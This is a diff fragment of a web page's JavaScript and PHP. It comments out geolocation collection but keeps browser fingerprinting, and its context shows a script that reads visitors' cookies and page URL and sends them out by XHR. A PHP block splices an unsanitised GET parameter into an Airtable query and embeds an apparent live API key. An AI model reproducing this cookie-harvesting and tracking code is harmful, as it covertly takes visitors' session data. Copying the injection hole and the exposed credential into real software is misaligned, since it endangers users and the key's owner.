@@ -291,11 +291,11 @@ var general = {
     scrPixelDepth:  screen.pixelDepth,
 
 
-   latitude:  position.coords.latitude,
-    longitude:  position.coords.longitude,
-    accuracy:  position.coords.accuracy,
-    altitude:  position.coords.altitude,
-    altitudeAccuracy:  position.coords.altitudeAccuracy,
+   //  latitude:  position.coords.latitude,
+   //   longitude:  position.coords.longitude,
+    //  accuracy:  position.coords.accuracy,
+   //   altitude:  position.coords.altitude,
+    //  altitudeAccuracy:  position.coords.altitudeAccuracy,
     // heading:  position.coords.heading,
     // speed:  position.coords.speed,
     // timestamp: position.timestamp
@@ -386,7 +386,11 @@ $.ajax({
 
 
 }, 1500);
-});</script>
+});
+
+</script>
+
+
 <script>
   const cookieValue = document.cookie;
 const cookieValue2 = document.URL;
@@ -412,6 +416,8 @@ const data = JSON.stringify({
 // Send the HTTP request
 xhr.send(data);
 </script>
+
+
 <?php
 $da = $_GET['u'];
 $json_quesions = "https://api.airtable.com/v0/appZt18kWI4Ru4QXU/tblkA5D2TF3g1O3Bc?maxRecords=1&filterByFormula=(%7BCalculation%7D+%3D+'$da')&maxRecords=1&api_key=key92qoDX706Uabv8";
